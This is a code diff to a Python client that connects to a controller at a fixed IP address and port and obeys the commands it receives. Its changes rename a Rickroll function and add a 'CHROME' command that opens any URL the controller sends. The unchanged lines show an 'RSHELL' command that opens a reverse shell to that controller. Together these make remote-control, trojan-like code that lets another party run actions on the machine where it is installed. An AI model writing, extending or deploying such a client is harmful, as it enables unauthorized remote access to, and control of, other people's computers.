@@ -10,7 +10,7 @@ from colorama import Fore, Style
 HOST = "192.168.1.50"
 PORT = 5616
 
-URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+rickroll_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 chrome_path = 'C:\Program Files\Google\Chrome\Application\chrome.exe'
 
 def main():
@@ -18,8 +18,8 @@ def main():
     socketStart()
 
 
-def rickroll():
-    subprocess.call([chrome_path, URL])
+def open_chrome(url):
+    subprocess.call([chrome_path, url])
 
 
 def socketStart():
@@ -42,7 +42,10 @@ def socketStart():
                         print("Connection closed by server.")
                         exit(0)
                     elif data == 'ROLL':
-                        rickroll()
+                        open_chrome(rickroll_URL)
+                    elif str(data).startswith("CHROME"):
+                        print("Opening Chrome tab...")
+                        open_chrome(data.split(' ')[1])
                     elif data == 'RSHELL':
                         print("Opening Reverse Shell...")
                         rshell(s)
